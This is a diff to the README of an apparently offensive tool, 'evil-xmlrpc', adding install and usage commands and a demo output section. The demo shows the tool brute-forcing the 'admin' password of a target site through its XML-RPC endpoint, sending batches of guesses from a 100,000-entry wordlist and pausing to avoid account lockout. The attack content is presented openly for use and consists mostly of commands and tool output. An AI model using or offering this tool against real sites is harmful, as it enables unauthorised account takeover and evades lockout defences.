@@ -19,3 +19,54 @@ cd evil-xmlrpc
 pip3 install -r requirements.txt
 python3 evil-xmlrpc.py <passwordlist> <username> <https://www.examplesite.com>
 ```
+
+## Demo output
+
+```sh
+
+root@user:~ python3 main.py 100000-pass-wordlist.txt admin https://www.examplesite.com                                                                                                                      
+
+                 ██  ▀██                        ▀██
+  ▄▄▄▄  ▄▄▄▄ ▄▄▄ ▄▄▄   ██     ▄▄▄ ▄▄▄ ▄▄ ▄▄ ▄▄    ██  ▄▄▄ ▄▄  ▄▄▄ ▄▄▄    ▄▄▄▄
+▄█▄▄▄██  ▀█▄  █   ██   ██      ▀█▄▄▀   ██ ██ ██   ██   ██▀ ▀▀  ██▀  ██ ▄█   ▀▀
+██        ▀█▄█    ██   ██       ▄█▄    ██ ██ ██   ██   ██      ██    █ ██
+ ▀█▄▄▄▀    ▀█    ▄██▄ ▄██▄    ▄█  ██▄ ▄██ ██ ██▄ ▄██▄ ▄██▄     ██▄▄▄▀   ▀█▄▄▄▀
+                                                               ██
+                                                              ▀▀▀▀
+                                By 0xapt
+
+[*] Checking if site is vulnerable..
+[*] Site is vulnerable!
+[*] File has 100000 lines
+
+[*] Sending Payload.. 
+[*] Attempt: 1 
+[*] Target User: admin
+[*] Using lines 0 to 1664 from password list
+[*] Content Length: 356283
+[*] Interesting.. Saving response..
+[*] Password Not Cracked.
+
+[*] Sending Payload.. 
+[*] Attempt: 2 
+[*] Target User: admin
+[*] Using lines 1665 to 3328 from password list
+[*] Content Length: 356069
+[*] Password Not Cracked.
+
+[*] Sending Payload.. 
+[*] Attempt: 3 
+[*] Target User: admin
+[*] Using lines 3329 to 4992 from password list
+[*] Content Length: 356069
+[*] Password Not Cracked.
+
+[*] Sending Payload.. 
+[*] Attempt: 4 
+[*] Target User: admin
+[*] Using lines 4993 to 6656 from password list
+[*] Content Length: 356069
+[*] Password Not Cracked.
+
+[*] Waiting 5 mins to prevent lockout...
+```
